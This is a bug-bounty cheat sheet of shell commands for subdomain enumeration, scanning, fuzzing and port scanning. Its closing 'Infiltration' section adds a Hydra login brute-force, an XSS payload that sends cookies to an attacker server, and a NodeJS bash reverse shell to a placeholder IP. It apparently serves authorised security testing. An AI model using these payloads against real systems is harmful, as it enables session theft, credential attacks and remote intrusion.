# Asset Enumeration

### Assetfinder Domain Lookup:
```bash
assetfinder <domain> > /path/to/your/targets/<target>/assetfinder.txt
```
### Nuclei Single Search:
```bash
nuclei -H "User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL" -u <domain> -rl 50 -me "/path/to/your/targets/<target>/nuclei" -fr -project /path/to/your/targets/<target>/nuclei -eid http-missing-security-headers
```

### Nuclei Bulk Search:
```bash
nuclei -H "User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL" -l /path/to/your/targets/<target>/in_scope.txt -rl 50 -me "/path/to/your/targets/<target>/nuclei" -fr -project /path/to/your/targets/<target>/nuclei -eid http-missing-security-headers
```

### Nuclei Specific-Template Search:
```bash
nuclei -H "User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL" -l /path/to/your/targets/<target>/subs.txt -rl 50 -me "/path/to/your/targets/<target>/nuclei" -id email-extractor -fr -eid http-missing-security-headers
```

### Waybackmachine Domain Lookup:
```bash
waybackurls <domain> | httpx -silent > /path/to/your/targets/<target>/waybackurls.txt
```

### Subfinder Domain Lookup:
```bash
subfinder -d <domain> -silent -rl 50 -active -oD /path/to/your/targets/<target>/subfinder/
```

### Amass Domain Lookup:
```bash
amass enum --passive -dns-qps 50 -timeout 20 -d <domain> -o /path/to/your/targets/<target>/amass/output.txt
```

### Amass Domain Lookup with Previous Subfinder Output:
```bash
amass enum --passive -dns-qps 50 -timeout 20 -d <domain> -o /path/to/your/targets/<target>/amass/output.txt -nf "/path/to/your/targets/<target>/subfinder/<domain>.txt"
```

### Multi-Chain Asset Enumeration (including filtering of alive domains):
```bash
subfinder -d <domain> -silent -rl 50 -active -oD /path/to/your/targets/<target>/subfinder/ && \
assetfinder <domain> >> /path/to/your/targets/<target>/subfinder/<domain>.txt && \
waybackurls <domain> >> /path/to/your/targets/<target>/subfinder/<domain>.txt && \
amass enum --passive -dns-qps 50 -timeout 20 -d <domain> -o /path/to/your/targets/<target>/amass.txt -nf "/path/to/your/targets/<target>/subfinder/<domain>.txt" && \
cat /path/to/your/targets/<target>/amass.txt | httpx -silent > /path/to/your/targets/<target>/final_assets.txt
```

### Add domain to BBRF:
```bash
bbrf domain add '*.example.com'
```

### Resolve Domains and Update BBRF:
```bash
for p in $(bbrf programs); do
  bbrf domains --view unresolved -p $p | \
  dnsx -silent -a -resp | tr -d '[]' | tee \
      >(awk '{print $1":"$2}' | bbrf domain update - -p $p -s dnsx) \
      >(awk '{print $1":"$2}' | bbrf domain add - -p $p -s dnsx) \
      >(awk '{print $2":"$1}' | bbrf ip add - -p $p -s dnsx) \
      >(awk '{print $2":"$1}' | bbrf ip update - -p $p -s dnsx)
done
```

### Parameter Enumeration in Burp via WSL to Windows Host Machine:
```bash
waybackurls <domain> | qsreplace "USERNAME" > /path/to/your/targets/<target>/fuzz.txt && ffuf -u FUZZ -w /path/to/your/targets/<target>/fuzz.txt -replay-proxy "https://$winhost:8080"
```

### Meg Enumeration with BBRF:
```bash
rm -rf /path/to/your/targets/<target>/.tmp && mkdir /path/to/your/targets/<target>/.tmp && bbrf domains | awk '{print "https://" $0}' > /path/to/your/targets/<target>/.tmp/hosts && meg --verbose -H "User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL" -H "X-HackerOne-Research: USERNAME" --savestatus 200 /path/to/your/wordlists/simple-paths.txt /path/to/your/targets/<target>/.tmp/hosts /path/to/your/targets/<target>/meg_output/
```

### Nuclei Search With Active Domains from BBRF:
```bash
bbrf domains where source is dnsx | nuclei -H "User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL" -H "X-HackerOne-Research: USERNAME" -rl 50 -me "/path/to/your/targets/<target>/nuclei" -fr -project /path/to/your/targets/<target>/nuclei -eid http-missing-security-headers -debug
```

# Content Discovery

### Search Github Org for Exposed Secrets/API keys:
```bash
trufflehog github --org=ORGANISATION
```

### FFUZ Fuzzing:
```bash
ffuf -w /path/to/your/wordlists/jhaddix_all.txt -u <URL>/FUZZ -H 'User-Agent: USERNAME HACKERONE_EMAIL' -recursion -recursion-depth 5 -c -maxtime 3600 -rate 20 -p "0.1-2.0" -fc 404 -od /path/to/your/targets/<target>/ffuf/
```

### Decompile/Analyse APK files with [apkrip.sh](/Script-Hub/Cybersecurity/Red%20Team/Python/apkrip/):
```bash
./apkrip.sh -f /path/to/your/targets/<target>/<app>.apk -d /path/to/your/targets/<target> -t <target>
```


### Feroxbuster Fuzzing:
```bash
sudo docker run --init -v /path/to/your/wordlists/:/wordlists/ -v /path/to/your/targets/<target>/feroxbuster/:/target/ -it epi052/feroxbuster -u <domain> -H 'User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL' -C 404 -C 302 -C 301 -d 6 --rate-limit 50 -w <wordlist> -o /target/feroxbuster.txt
```

### Spider for Subdomains/Directories:
```bash
gospider -q -s <domain> -H 'User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL' -o /path/to/your/targets/<target>/spider -c 20
```

### Jaeles Scanning:
```bash
jaeles scan -s 'js,html,php' -c 20 -u <domain> -H 'User-Agent: Mozilla Firefox USERNAME HACKERONE_EMAIL' -o /path/to/your/targets/<target>/jaeles -v
```

### Naabu Port Scan (Top 1000 Ports) into nmap Port Scan:
```bash
cd /path/to/your/targets/<target>/ && naabu -host <domain> -tp 1000 -rate 100 -nmap-cli 'nmap -sV -sC -oA <target> -T2'
```

### Simple nmap Scan:
```bash
nmap -sC -sV -T2 -oA <target> <domain>
```

### Check .DS_Store Files for Leftover Data:
```bash
python3 ./main.py /path/to/your/targets/<target>/.DS_Store
```

### Check Slack Webhook:
```bash
curl -s -X POST -H "Content-type: application/json" -d '{"text":""}' "SLACK_WEBHOOK_URL"
```

## Infiltration

### Hydra Login Form Brute-Force:
```bash
hydra -L /path/to/your/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /path/to/your/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt <domain> -s <port> http-post-form "/api/login/:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}: NOT FOUND"
```

### Quick Image-Based XSS:
```bash
<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>
```

### Netcat Listener:
```bash
nc <yourserver> <yourport>
```

### NC Reverse shell from NodeJS process:
```bash
require('child_process').exec('bash -c "bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1"')
```

# Utility

### Generate a Self-Signed SSL Certificate and Key File:
```bash
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ./selfsigned.key -out selfsigned.crt
```

### Partial String Match in Directory (useful for wildcard-type searches):
```bash
grep -nr '<string>' <directory>
```